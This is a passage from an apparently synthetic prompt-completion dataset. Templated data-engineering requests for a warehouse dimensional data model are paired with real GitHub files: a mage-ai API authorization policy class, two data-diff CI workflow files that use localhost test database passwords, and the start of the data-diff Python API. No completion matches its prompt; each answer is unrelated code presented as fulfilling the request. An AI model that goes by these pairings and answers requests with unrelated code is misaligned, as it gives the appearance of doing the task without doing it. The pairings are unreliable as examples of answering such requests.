"github.com/mage-ai/mage-ai", "file_path": "mage_ai/api/policies/BackfillPolicy.py", "language": "python", "complexity": "simple", "star_count": 8424, "quality_score": 0.85, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import importlib\nimport inspect\nfrom collections.abc import Iterable\nfrom typing import Callable, List, Tuple, Union\n\nimport inflection\n\nfrom mage_ai import settings\nfrom mage_ai.api.constants import AttributeOperationType, AttributeType\nfrom mage_ai.api.errors import ApiError\nfrom mage_ai.api.mixins.result_set import ResultSetMixIn\nfrom mage_ai.api.oauth_scope import OauthScope\nfrom mage_ai.api.operations.constants import OperationType\nfrom mage_ai.api.policies.mixins.user_permissions import UserPermissionMixIn\nfrom mage_ai.api.result_set import ResultSet\nfrom mage_ai.api.utils import (\n    has_at_least_admin_role,\n    has_at_least_editor_role,\n    has_at_least_editor_role_and_notebook_edit_access,\n    has_at_least_editor_role_and_pipeline_edit_access,\n    has_at_least_viewer_role,\n    is_owner,\n)\nfrom mage_ai.data_preparation.repo_manager import get_project_uuid\nfrom mage_ai.orchestration.constants import Entity\nfrom mage_ai.server.api.constants import URL_PARAMETER_API_KEY\nfrom mage_ai.services.tracking.metrics import increment\nfrom mage_ai.settings import (\n    DISABLE_NOTEBOOK_EDIT_ACCESS,\n    REQUIRE_USER_AUTHENTICATION,\n    REQUIRE_USER_PERMISSIONS,\n)\nfrom mage_ai.shared.hash import extract, ignore_keys\n\nCONTEXT_DATA_KEY_USER_ROLE_VALIDATIONS = '__user_role_validations'\n\n\nclass BasePolicy(UserPermissionMixIn, ResultSetMixIn):\n    action_rules = {}\n    query_rules = {}\n    read_rules = {}\n    write_rules = {}\n    override_permission_action_rules = {}\n    override_permission_query_rules = {}\n    override_permission_read_rules = {}\n    override_permission_write_rules = {}\n\n    def __init__(self, resource, current_user, **kwargs):\n        self.current_user = current_user\n        self.options = kwargs\n        self.resource = resource\n        self.parent_model_attr = None\n        self.parent_resource_attr = None\n        self.result_set_attr = None\n\n        if resource:\n            if isinstance(resource, Iterable):\n                self.resources = resource\n            else:\n                self.resources = [resource]\n        else:\n            self.result_set_attr = ResultSet([])\n\n        # This is only used to override the environment variable when bootstrapping permissions.\n        self.disable_notebook_edit_access_override = None\n\n    @property\n    def entity(self) -> Tuple[Union[Entity, None], Union[str, None]]:\n        return Entity.PROJECT, get_project_uuid()\n\n    @classmethod\n    def action_rule(self, action):\n        if REQUIRE_USER_PERMISSIONS:\n            return self.action_rule_with_permissions(action)\n\n        if not self.action_rules.get(self.__name__):\n            self.action_rules[self.__name__] = {}\n        return self.action_rules[self.__name__].get(action)\n\n    @classmethod\n    def override_permission_action_rule(self, action):\n        if not self.override_permission_action_rules.get(self.__name__):\n            self.override_permission_action_rules[self.__name__] = {}\n        return self.override_permission_action_rules[self.__name__].get(action)\n\n    @classmethod\n    def query_rule(self, query):\n        if REQUIRE_USER_PERMISSIONS:\n            return self.attribute_rule_with_permissions(AttributeOperationType.QUERY, query)\n\n        if not self.query_rules.get(self.__name__):\n            self.query_rules[self.__name__] = {}\n        return self.query_rules[self.__name__].get(query)\n\n    @classmethod\n    def override_permission_query_rule(self, query):\n        if not self.override_permission_query_rules.get(self.__name__):\n            self.override_permission_query_rules[self.__name__] = {}\n        return self.override_permission_query_rules[self.__name__].get(query)\n\n    @classmethod\n    def read_rule(self, read):\n        if REQUIRE_USER_PERMISSIONS:\n            return self.attribute_rule_with_permissions(AttributeOperationType.READ, read)\n\n        if not self.read_rules.get(self.__name__):\n            self.read_rules[self.__name__] = {}\n        return self.read_rules[self.__name__].get(read)\n\n    @classmethod\n    def override_permission_read_rule(self, read):\n        if not self.override_permission_read_rules.get(self.__name__):\n            self.override_permission_read_rules[self.__name__] = {}\n        return self.override_permission_read_rules[self.__name__].get(read)\n\n    @classmethod\n    def write_rule(self, write):\n        if REQUIRE_USER_PERMISSIONS:\n            return self.attribute_rule_with_permissions(AttributeOperationType.WRITE, write)\n\n        if not self.write_rules.get(self.__name__):\n            self.write_rules[self.__name__] = {}\n        return self.write_rules[self.__name__].get(write)\n\n    @classmethod\n    def override_permission_write_rule(self, write):\n        if not self.override_permission_write_rules.get(self.__name__):\n            self.override_permission_write_rules[self.__name__] = {}\n        return self.override_permission_write_rules[self.__name__].get(write)\n\n    @classmethod\n    def allow_actions(self, array, **kwargs):\n        if not self.action_rules.get(self.__name__):\n            self.action_rules[self.__name__] = {}\n        if not self.override_permission_action_rules.get(self.__name__):\n            self.override_permission_action_rules[self.__name__] = {}\n\n        array_use = array or [OperationType.ALL]\n        for key in array_use:\n            if not self.action_rules[self.__name__].get(key):\n                self.action_rules[self.__name__][key] = {}\n            for scope in kwargs.get('scopes', []):\n                if scope not in self.action_rules[self.__name__][key]:\n                    self.action_rules[self.__name__][key][scope] = []\n                self.action_rules[self.__name__][key][scope].append(\n                    extract(kwargs, ['condition']),\n                )\n\n            if not self.override_permission_action_rules[self.__name__].get(key):\n                self.override_permission_action_rules[self.__name__][key] = {}\n            for scope in kwargs.get('scopes', []):\n                if scope not in self.override_permission_action_rules[self.__name__][key]:\n                    self.override_permission_action_rules[self.__name__][key][scope] = []\n                self.override_permission_action_rules[self.__name__][key][scope].append(extract(\n                    kwargs,\n                    [\n                        'override_permission_condition',\n                    ],\n                ))\n\n    @classmethod\n    def allow_query(self, array: List = None, **kwargs):\n        if not self.query_rules.get(self.__name__):\n            self.query_rules[self.__name__] = {}\n        if not self.override_permission_query_rules.get(self.__name__):\n            self.override_permission_query_rules[self.__name__] = {}\n\n        array_use = array or [AttributeType.ALL]\n        for key in array_use:\n            if not self.query_rules[self.__name__].get(key):\n                self.query_rules[self.__name__][key] = {}\n            if not self.override_permission_query_rules[self.__name__].get(key):\n                self.override_permission_query_rules[self.__name__][key] = {}\n\n            actions = kwargs.get('on_action', [OperationType.ALL])\n            actions = actions if isinstance(actions, list) else [actions]\n\n            for scope in kwargs.get('scopes', []):\n                if not self.query_rules[self.__name__][key].get(scope):\n                    self.query_rules[self.__name__][key][scope] = {}\n                for action in actions:\n                    if action not in self.query_rules[self.__name__][key][scope]:\n                        self.query_rules[self.__name__][key][scope][action] = []\n                    self.query_rules[self.__name__][key][scope][action].append(extract(\n                        kwargs,\n                        [\n                            'condition',\n                        ],\n                    ))\n\n                if not self.override_permission_query_rules[self.__name__][key].get(scope):\n                    self.override_permission_query_rules[self.__name__][key][scope] = {}\n                for action in actions:\n                    if action not in \\\n                            self.override_permission_query_rules[self.__name__][key][scope]:\n\n                        self.override_permission_query_rules[self.__name__][key][scope][action] = []\n                    self.override_permission_query_rules[self.__name__][key][scope][action].append(\n                        extract(kwargs, ['override_permission_condition']),\n                    )\n\n    @classmethod\n    def allow_read(self, array, **kwargs):\n        if not self.read_rules.get(self.__name__):\n            self.read_rules[self.__name__] = {}\n        if not self.override_permission_read_rules.get(self.__name__):\n            self.override_permission_read_rules[self.__name__] = {}\n\n        for key in array:\n            if not self.read_rules[self.__name__].get(key):\n                self.read_rules[self.__name__][key] = {}\n            if not self.override_permission_read_rules[self.__name__].get(key):\n                self.override_permission_read_rules[self.__name__][key] = {}\n\n            actions = kwargs.get('on_action', [OperationType.ALL])\n            actions = actions if isinstance(actions, list) else [actions]\n\n            for scope in kwargs.get('scopes', []):\n                if not self.read_rules[self.__name__][key].get(scope):\n                    self.read_rules[self.__name__][key][scope] = {}\n                for action in actions:\n                    if action not in self.read_rules[self.__name__][key][scope]:\n                        self.read_rules[self.__name__][key][scope][action] = []\n                    self.read_rules[self.__name__][key][scope][action].append(\n                        extract(kwargs, ['condition']),\n                    )\n\n                if not self.override_permission_read_rules[self.__name__][key].get(scope):\n                    self.override_permission_read_rules[self.__name__][key][scope] = {}\n                for action in actions:\n                    if action not in self.override_permission_read_rules[self.__name__][key][scope]:\n                        self.override_permission_read_rules[self.__name__][key][scope][action] = []\n                    self.override_permission_read_rules[self.__name__][key][scope][action].append(\n                        extract(kwargs, ['override_permission_condition']),\n                    )\n\n    @classmethod\n    def allow_write(self, array, **kwargs):\n        if not self.write_rules.get(self.__name__):\n            self.write_rules[self.__name__] = {}\n        if not self.override_permission_write_rules.get(self.__name__):\n            self.override_permission_write_rules[self.__name__] = {}\n\n        for key in array:\n            if not self.write_rules[self.__name__].get(key):\n                self.write_rules[self.__name__][key] = {}\n            if not self.override_permission_write_rules[self.__name__].get(key):\n                self.override_permission_write_rules[self.__name__][key] = {}\n\n            actions = kwargs.get('on_action', [OperationType.ALL])\n            actions = actions if isinstance(actions, list) else [actions]\n\n            for scope in kwargs.get('scopes', []):\n                if not self.write_rules[self.__name__][key].get(scope):\n                    self.write_rules[self.__name__][key][scope] = {}\n                for action in actions:\n                    if action not in self.write_rules[self.__name__][key][scope]:\n                        self.write_rules[self.__name__][key][scope][action] = []\n                    self.write_rules[self.__name__][key][scope][action].append(\n                        extract(kwargs, ['condition']),\n                    )\n\n                if not self.override_permission_write_rules[self.__name__][key].get(scope):\n                    self.override_permission_write_rules[self.__name__][key][scope] = {}\n                for action in actions:\n                    if action not in \\\n                            self.override_permission_write_rules[self.__name__][key][scope]:\n\n                        self.override_permission_write_rules[self.__name__][key][scope][action] = []\n                    self.override_permission_write_rules[self.__name__][key][scope][action].append(\n                        extract(kwargs, ['override_permission_condition']),\n                    )\n\n    @classmethod\n    def resource_name(self):\n        return inflection.pluralize(self.resource_name_singular())\n\n    @classmethod\n    def model_name(self) -> str:\n        return self.__name__.replace('Policy', '')\n\n    @classmethod\n    def resource_name_singular(self):\n        return inflection.underscore(\n            self.__name__.replace(\n                'Policy', '')).lower()\n\n    def is_owner(self) -> bool:\n        def _validate(\n            user=self.current_user,\n            entity=self.entity[0],\n            entity_id=self.entity[1],\n        ):\n            return is_owner(\n                user,\n                entity=entity,\n                entity_id=entity_id,\n            )\n\n        return self.__get_and_set_user_role_validation('is_owner', _validate)\n\n    def has_at_least_admin_role(self) -> bool:\n        def _validate(\n            user=self.current_user,\n            entity=self.entity[0],\n            entity_id=self.entity[1],\n        ):\n            return has_at_least_admin_role(\n                user,\n                entity=entity,\n                entity_id=entity_id,\n            )\n\n        return self.__get_and_set_user_role_validation('has_at_least_admin_role', _validate)\n\n    def has_at_least_editor_role(self) -> bool:\n        def _validate(\n            user=self.current_user,\n            entity=self.entity[0],\n            entity_id=self.entity[1],\n        ):\n            return has_at_least_editor_role(\n                user,\n                entity=entity,\n                entity_id=entity_id,\n            )\n\n        return self.__get_and_set_user_role_validation('has_at_least_editor_role', _validate)\n\n    def has_at_least_editor_role_and_notebook_edit_access(\n        self,\n        disable_notebook_edit_access_override: int = None,\n    ) -> bool:\n        disable_notebook = (\n            disable_notebook_edit_access_override or\n            self.disable_notebook_edit_access_override\n        )\n\n        def _validate(\n            user=self.current_user,\n            entity=self.entity[0],\n            entity_id=self.entity[1],\n            disable_notebook=disable_notebook,\n        ):\n            return has_at_least_editor_role_and_notebook_edit_access(\n                user,\n                entity=entity,\n                entity_id=entity_id,\n                disable_notebook_edit_access_override=disable_notebook,\n            )\n\n        return self.__get_and_set_user_role_validation(\n            'has_at_least_editor_role_and_notebook_edit_access',\n            _validate,\n        )\n\n    def has_at_least_editor_role_and_pipeline_edit_access(\n        self,\n        disable_notebook_edit_access_override: int = None,\n    ) -> bool:\n        disable_notebook = (\n            disable_notebook_edit_access_override or\n            self.disable_notebook_edit_access_override\n        )\n\n        def _validate(\n            user=self.current_user,\n            entity=self.entity[0],\n            entity_id=self.entity[1],\n            disable_notebook=disable_notebook,\n        ):\n            return has_at_least_editor_role_and_pipeline_edit_access(\n                user,\n                entity=entity,\n                entity_id=entity_id,\n                disable_notebook_edit_access_override=disable_notebook,\n            )\n\n        return self.__get_and_set_user_role_validation(\n            'has_at_least_editor_role_and_pipeline_edit_access',\n            _validate,\n        )\n\n    def has_at_least_viewer_role(self) -> bool:\n        def _validate(\n            user=self.current_user,\n            entity=self.entity[0],\n            entity_id=self.entity[1],\n        ):\n            return has_at_least_viewer_role(\n                user,\n                entity=entity,\n                entity_id=entity_id,\n            )\n\n        return self.__get_and_set_user_role_validation('has_at_least_viewer_role', _validate)\n\n    async def authorize_action(self, action):\n        if (\n            not REQUIRE_USER_AUTHENTICATION and\n            not DISABLE_NOTEBOOK_EDIT_ACCESS and\n            action in [OperationType.CREATE, OperationType.DELETE, OperationType.UPDATE]\n        ):\n            return True\n\n        if not DISABLE_NOTEBOOK_EDIT_ACCESS and REQUIRE_USER_PERMISSIONS and self.is_owner():\n            return True\n\n        config = self.__class__.action_rule(action)\n        if config:\n            await self.__validate_scopes(action, config.keys())\n\n            rules = config.get(self.current_scope()) or []\n            conditions = [rule.get('condition') for rule in rules if rule.get('condition')]\n            if conditions and len(conditions) >= 1:\n                override_permission_conditions = None\n                config_override = self.__class__.override_permission_action_rule(action)\n                if config_override:\n                    override_rules = config_override.get(self.current_scope())\n                    if override_rules:\n                        override_permission_conditions = \\\n                            [rule.get('override_permission_condition') for rule in override_rules\n                                if rule.get('override_permission_condition')]\n\n                await self.__validate_condition(\n                    action,\n                    conditions,\n                    operation=action,\n                    override_permission_conditions=override_permission_conditions\n                )\n        else:\n            error = ApiError.UNAUTHORIZED_ACCESS\n            error.update({'message': 'The {} action is disabled for {}.'.format(\n                action, self.resource_name()), })\n            raise ApiError(error)\n\n    async def authorize_attribute(self, read_or_write, attrb, **kwargs):\n        if not REQUIRE_USER_AUTHENTICATION or self.is_owner():\n            return True\n\n        if not DISABLE_NOTEBOOK_EDIT_ACCESS and REQUIRE_USER_PERMISSIONS and self.is_owner():\n            return True\n\n        api_operation_action = self.options.get(\n            'api_operation_action',\n            kwargs.get('api_operation_action', OperationType.ALL),\n        )\n\n        attribute_operation = None\n        if 'read' == read_or_write:\n            attribute_operation = AttributeOperationType.READ\n            orig_config = self.__class__.read_rule(attrb)\n            orig_config_override = self.__class__.override_permission_read_rule(attrb)\n        else:\n            attribute_operation = AttributeOperationType.WRITE\n            orig_config = self.__class__.write_rule(attrb)\n            orig_config_override = self.__class__.override_permission_write_rule(attrb)\n\n        rules = None\n        if orig_config:\n            await self.__validate_scopes(attrb, orig_config.keys())\n            config_scope = orig_config.get(self.current_scope(), {})\n            rules = config_scope.get(api_operation_action) or None\n\n            if rules is None:\n                rules = config_scope.get(OperationType.ALL)\n\n        override_permission_conditions = None\n        if orig_config_override:\n            await self.__validate_scopes(attrb, orig_config_override.keys())\n            config_override_scope = orig_config_override.get(self.current_scope(), {})\n            override_rules = config_override_scope.get(api_operation_action) or \\\n                config_override_scope.get(OperationType.ALL)\n\n            if override_rules:\n                override_permission_conditions = \\\n                    [rule.get('override_permission_condition') for rule in override_rules\n                        if rule.get('override_permission_condition')]\n\n        if rules is None:\n            error = ApiError.UNAUTHORIZED_ACCESS\n            error.update({\n                'message': '{} of {} on {} is disabled for {}.'.format(\n                    read_or_write,\n                    attrb,\n                    api_operation_action,\n                    self.__class__.resource_name(),\n                ),\n            })\n            raise ApiError(error)\n\n        conditions = [rule.get('condition') for rule in rules if rule.get('condition')]\n\n        if conditions and len(conditions) >= 1:\n            await self.__validate_condition(\n                attrb,\n                conditions,\n                attribute_operation=attribute_operation,\n                operation=api_operation_action,\n                override_permission_conditions=override_permission_conditions,\n                **kwargs,\n            )\n\n    async def authorize_attributes(self, read_or_write, attrbs, **kwargs):\n        if not REQUIRE_USER_AUTHENTICATION or self.is_owner():\n            return True\n\n        for attrb in attrbs:\n            await self.authorize_attribute(read_or_write, attrb, **kwargs)\n\n    async def authorize_query(self, query, **kwargs):\n        # If DISABLE_NOTEBOOK_EDIT_ACCESS is enabled, we will need to perform\n        # the policy check for queries.\n        if not DISABLE_NOTEBOOK_EDIT_ACCESS and (\n            not REQUIRE_USER_AUTHENTICATION or self.is_owner()\n        ):\n            return True\n\n        if not DISABLE_NOTEBOOK_EDIT_ACCESS and REQUIRE_USER_PERMISSIONS and self.is_owner():\n            return True\n\n        query_filtered = ignore_keys(query or {}, [URL_PARAMETER_API_KEY])\n\n        if not query_filtered:\n            return True\n\n        api_operation_action = self.options.get(\n            'api_operation_action',\n            kwargs.get('api_operation_action', OperationType.ALL),\n        )\n\n        for key, value in query_filtered.items():\n            if key == settings.QUERY_API_KEY:\n                continue\n\n            error_message = f'Query parameter {key} of value {value} ' \\\n                f'is not permitted on {api_operation_action} operation ' \\\n                f'for {self.__class__.resource_name()}.'\n\n            orig_config = self.__class__.query_rule(key) or \\\n                self.__class__.query_rule(AttributeType.ALL)\n\n            rules = None\n            if orig_config:\n                await self.__validate_scopes(key, orig_config.keys())\n                config_scope = orig_config.get(self.current_scope(), {})\n                rules = config_scope.get(api_operation_action) or None\n\n                if rules is None:\n                    rules = config_scope.get(OperationType.ALL)\n\n            orig_config_override = self.__class__.override_permission_query_rule(key) or \\\n                self.__class__.override_permission_query_rule(AttributeType.ALL)\n\n            override_permission_conditions = None\n            if orig_config_override:\n                await self.__validate_scopes(key, orig_config_override.keys())\n                config_override_scope = orig_config_override.get(self.current_scope(), {})\n                override_rules = config_override_scope.get(api_operation_action) or \\\n                    config_override_scope.get(OperationType.ALL)\n                if override_rules:\n                    override_permission_conditions = \\\n                        [rule.get('override_permission_condition') for rule in override_rules\n                            if rule.get('override_permission_condition')]\n\n            if rules is None:\n                error = ApiError.UNAUTHORIZED_ACCESS\n                error.update({\n                    'message': error_message,\n                })\n                raise ApiError(error)\n\n            conditions = [rule.get('condition') for rule in rules if rule.get('condition')]\n            if conditions and len(conditions) >= 1:\n                await self.__validate_condition(\n                    key,\n                    conditions,\n                    message=error_message,\n                    operation=api_operation_action,\n                    override_permission_conditions=override_permission_conditions,\n                )\n\n    def parent_model(self):\n        if not self.parent_model_attr:\n            self.parent_model_attr = self.options.get('parent_model', None)\n        return self.parent_model_attr\n\n    def parent_resource(self):\n        if not self.parent_resource_attr and self.parent_model():\n            parent_model_class = inflection.singularize(\n                self.parent_model().__class__.__name__,\n            )\n            self.parent_resource_attr = getattr(\n                importlib.import_module(\n                    'mage_ai.api.resources.{}Resource'.format(parent_model_class)),\n                '{}Resource'.format(parent_model_class),\n            )(self.parent_model(), self.current_user, **self.options)\n        return self.parent_resource_attr\n\n    def current_scope(self) -> OauthScope:\n        # If edit access is disabled and user authentication is not enabled, we want to\n        # treat the user as if they are logged in, so we can stop users from accessing\n        # certain endpoints.\n        if self.current_user or \\\n                (DISABLE_NOTEBOOK_EDIT_ACCESS and not REQUIRE_USER_AUTHENTICATION):\n            return OauthScope.CLIENT_PRIVATE\n        else:\n            return OauthScope.CLIENT_PUBLIC\n\n    def result_set(self) -> ResultSet:\n        if self.resource:\n            return self.resource.result_set()\n\n        return self.result_set_attr\n\n    async def __validate_condition(\n        self,\n        action,\n        conditions_functions: List[Callable[['BasePolicy'], None]],\n        attribute_operation: AttributeOperationType = None,\n        operation: OperationType = None,\n        override_permission_conditions: List[Callable[['BasePolicy'], None]] = None,\n        **kwargs,\n    ):\n        if not conditions_functions or len(conditions_functions) == 0:\n            return\n\n        validation = False\n        for condition in conditions_functions:\n            validation = condition(self)\n            if validation is not None and inspect.isawaitable(validation):\n                validation = await validation\n\n            if validation:\n                break\n\n        if not validation and override_permission_conditions:\n            for condition in override_permission_conditions:\n                validation = condition(self)\n                if validation is not None and inspect.isawaitable(validation):\n                    validation = await validation\n\n                if validation:\n                    break\n\n        if not validation:\n            r_name = self.resource_name()\n            error = ApiError.UNAUTHORIZED_ACCESS\n            message = f'Unauthorized access for {action} on {r_name}'\n\n            if attribute_operation:\n                message = f'Unauthorized {attribute_operation} access for {action} on {r_name}'\n                if operation:\n                    message = f'{message} for {operation} operation'\n            elif operation:\n                message = f'Unauthorized operation {operation} on {r_name}'\n\n            error.update({\n                'message': kwargs.get(\n                    'message',\n                    f'{message}, failed condition.',\n                ),\n            })\n            increment(\n                'api_error.unauthorized_access',\n                tags={\n                    'action': action,\n                    'attribute_operation': attribute_operation,\n                    'policy_class_name': self.__class__.__name__,\n                    'id': self.resource.id if hasattr(\n                        self.resource,\n                        'id') else None,\n                    'operation': operation,\n                })\n            if settings.DEBUG:\n                error['debug'] = {\n                    'action': action,\n                    'attribute_operation': attribute_operation,\n                    'operation': operation,\n                }\n            raise ApiError(error)\n\n    async def __validate_scopes(self, val, scopes):\n        error = ApiError.UNAUTHORIZED_ACCESS\n        if not REQUIRE_USER_AUTHENTICATION:\n            return\n        if OauthScope.CLIENT_ALL in scopes:\n            return\n        elif not self.current_user and OauthScope.CLIENT_PUBLIC not in scopes:\n            error.update({\n                'message': 'Private access for {} only, invalid scope.'.format(val),\n            })\n            if settings.DEBUG:\n                error['debug'] = {\n                    'class': self.__class__.__name__,\n                    'scopes': scopes,\n                }\n            raise ApiError(error)\n        elif self.current_user and OauthScope.CLIENT_PRIVATE not in scopes:\n            error.update({\n                'message': 'Public access for {} only, invalid scope.'.format(val),\n            })\n            if settings.DEBUG:\n                error['debug'] = {\n                    'scopes': scopes,\n                }\n            raise ApiError(error)\n\n    def __get_and_set_user_role_validation(\n        self,\n        key: str,\n        condition: Callable,\n    ) -> bool:\n        mapping = self.result_set().context.data.get(CONTEXT_DATA_KEY_USER_ROLE_VALIDATIONS) or {}\n        if key in mapping:\n            return mapping.get(key)\n\n        if CONTEXT_DATA_KEY_USER_ROLE_VALIDATIONS not in self.result_set().context.data:\n            self.result_set().context.data[CONTEXT_DATA_KEY_USER_ROLE_VALIDATIONS] = {}\n\n        validation = condition()\n        self.result_set().context.data[CONTEXT_DATA_KEY_USER_ROLE_VALIDATIONS][key] = validation\n\n        return validation\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/api/policies/BasePolicy.py", "language": "python", "complexity": "complex", "star_count": 8424, "quality_score": 0.8799999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: CI-COVER-VERSIONS\n\non:\n#   push:\n#     paths:\n#       - '**.py'\n#       - '.github/workflows/**'\n#       - '!dev/**'\n  pull_request:\n    branches: [ master ]\n\n  workflow_dispatch:\n\njobs:\n  unit_tests:\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest]\n        python-version:\n          - \"3.8\"\n          - \"3.9\"\n          - \"3.10\"\n          - \"3.11\"\n\n    name: Check Python ${{ matrix.python-version }} on ${{ matrix.os }}\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Setup Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v3\n        with:\n          python-version: ${{ matrix.python-version }}\n\n      - name: Build the stack\n        run: docker-compose up -d mysql postgres presto trino clickhouse vertica\n\n      - name: Install Poetry\n        run: pip install poetry\n\n      - name: Install package\n        run: \"poetry install\"\n\n      # BigQuery start\n    #   - id: 'auth'\n    #     uses: 'google-github-actions/auth@v1'\n    #     with:\n    #       credentials_json: '${{ secrets.GOOGLE_CREDENTIALS }}'\n\n    #   - name: 'Set up BigQuery Cloud SDK'\n    #     uses: 'google-github-actions/setup-gcloud@v1'\n\n    #   - name: 'Use gcloud CLI'\n    #     run: \"gcloud config configurations list\"\n\n      - name: \"Install BigQuery for Python\"\n        run: poetry add google-cloud-bigquery\n\n      # BigQuery end\n\n      - name: Run unit tests\n        env:\n            DATADIFF_SNOWFLAKE_URI: '${{ secrets.DATADIFF_SNOWFLAKE_URI }}'\n            DATADIFF_PRESTO_URI: '${{ secrets.DATADIFF_PRESTO_URI }}'\n            DATADIFF_TRINO_URI: '${{ secrets.DATADIFF_TRINO_URI }}'\n            # DATADIFF_BIGQUERY_URI: '${{ secrets.DATADIFF_BIGQUERY_URI }}'\n            DATADIFF_CLICKHOUSE_URI: 'clickhouse://clickhouse:Password1@localhost:9000/clickhouse'\n            DATADIFF_VERTICA_URI: 'vertica://vertica:Password1@localhost:5433/vertica'\n            DATADIFF_REDSHIFT_URI: '${{ secrets.DATADIFF_REDSHIFT_URI }}'\n            MOTHERDUCK_TOKEN: '${{ secrets.MOTHERDUCK_TOKEN }}'\n        run: |\n          chmod +x tests/waiting_for_stack_up.sh\n          ./tests/waiting_for_stack_up.sh && TEST_ACROSS_ALL_DBS=0 poetry run unittest-parallel -j 16\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": ".github/workflows/ci.yml", "language": "yaml", "complexity": "medium", "star_count": 2981, "quality_score": 0.63, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: CI-COVER-DATABASES\n\non:\n#   push:\n#     paths:\n#       - '**.py'\n#       - '.github/workflows/**'\n#       - '!dev/**'\n  pull_request:\n    branches: [ master ]\n  workflow_dispatch:\n\npermissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout\n\njobs:\n  unit_tests:\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest]\n        python-version:\n          - \"3.11\"\n\n    name: Check Python ${{ matrix.python-version }} on ${{ matrix.os }}\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/checkout@v3\n\n      - name: Setup Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v3\n        with:\n          python-version: ${{ matrix.python-version }}\n\n      - name: Build the stack\n        run: docker-compose up -d mysql postgres presto trino clickhouse vertica\n\n      - name: Install Poetry\n        run: pip install poetry\n\n      - name: Install package\n        run: \"poetry install\"\n\n      # BigQuery start\n    #   - id: 'auth'\n    #     uses: 'google-github-actions/auth@v1'\n    #     with:\n    #       credentials_json: '${{ secrets.GOOGLE_CREDENTIALS }}'\n\n    #   - name: 'Set up BigQuery Cloud SDK'\n    #     uses: 'google-github-actions/setup-gcloud@v1'\n\n    #   - name: \"Install BigQuery for Python\"\n    #     run: poetry add google-cloud-bigquery\n\n      # BigQuery end\n\n      - name: Run unit tests\n        env:\n            DATADIFF_SNOWFLAKE_URI: '${{ secrets.DATADIFF_SNOWFLAKE_URI }}'\n            DATADIFF_PRESTO_URI: '${{ secrets.DATADIFF_PRESTO_URI }}'\n            DATADIFF_CLICKHOUSE_URI: 'clickhouse://clickhouse:Password1@localhost:9000/clickhouse'\n            DATADIFF_VERTICA_URI: 'vertica://vertica:Password1@localhost:5433/vertica'\n            # DATADIFF_BIGQUERY_URI: '${{ secrets.DATADIFF_BIGQUERY_URI }}'\n            DATADIFF_REDSHIFT_URI: '${{ secrets.DATADIFF_REDSHIFT_URI }}'\n            MOTHERDUCK_TOKEN: '${{ secrets.MOTHERDUCK_TOKEN }}'\n        run: |\n          chmod +x tests/waiting_for_stack_up.sh\n          ./tests/waiting_for_stack_up.sh && poetry run unittest-parallel -j 16\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": ".github/workflows/ci_full.yml", "language": "yaml", "complexity": "medium", "star_count": 2981, "quality_score": 0.6, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from typing import Sequence, Tuple, Iterator, Optional, Union\n\nfrom data_diff.abcs.database_types import DbTime, DbPath\nfrom data_diff.databases import Database\nfrom data_diff.tracking import disable_tracking\nfrom data_diff.databases._connect import connect\nfrom data_diff.diff_tables import Algorithm\nfrom data_diff.hashdiff_tables import HashDiffer, DEFAULT_BISECTION_THRESHOLD, DEFAULT_BISECTION_FACTOR\nfrom data_diff.joindiff_tables import JoinDiffer, TABLE_WRITE_LIMIT\nfrom data_diff.table_segment import TableSegment\nfrom data_diff.utils import eval_name_template, Vector\n\n\ndef connect_to_table(\n    db_info: Union[str, dict],\n    table_name: Union[DbPath, str],\n    key_columns: str = (\"id\",),\n    thread_count: Optional[int] = 1,\n    **kwargs,\n) -> TableSegment:\n    \"\"\"Connects to the given database, and creates a TableSegment instance\n\n    Parameters:\n        db_info: Either a URI string, or a dict of connection options.\n        table_name: Name of the table as a string, or a tuple that signifies the path.\n        key_columns: Names of the key columns\n        thread_count: Number of threads for this connection (only if using a threadpooled db implementation)\n\n    See Also:\n        :meth:`connect`\n    \"\"\"\n    if isinstance(key_columns, str):\n        key_columns = (key_columns,)\n\n    db: Database = connect(db_info, thread_count=thread_count)\n\n    if isinstance(table_name, str):\n        table_name = db.dialect.parse_table_name(table_name)\n\n    return TableSegment(db, table_name, key_columns, **kwargs)\n\n\ndef diff_tables(\n    table1: TableSegment,\n    table2: TableSegment,\n    *,\n    # Name of the key column, which uniquely identifies each row (usually id)\n    key_columns: Sequence[str] = None,\n    # Name of updated column, which signals that rows changed (usually updated_at or last_update)\n    update_column: str = None,\n    # Extra columns to compare\n    extra_columns: Tuple[str, ...] = None,\n    # Start/end key_column values, used to restrict the segment\n    min_key: Vector = None,\n    max_key: Vector = None,\n    # Start/end update_column values, used to restrict the segment\n    min_update: DbTime = None,\n    max_update: DbTime = None,\n    # Enable/disable threaded diffing. Needed to take advantage of database threads.\n    threaded: bool = True,\n    # Maximum size of each threadpool. None = auto. Only 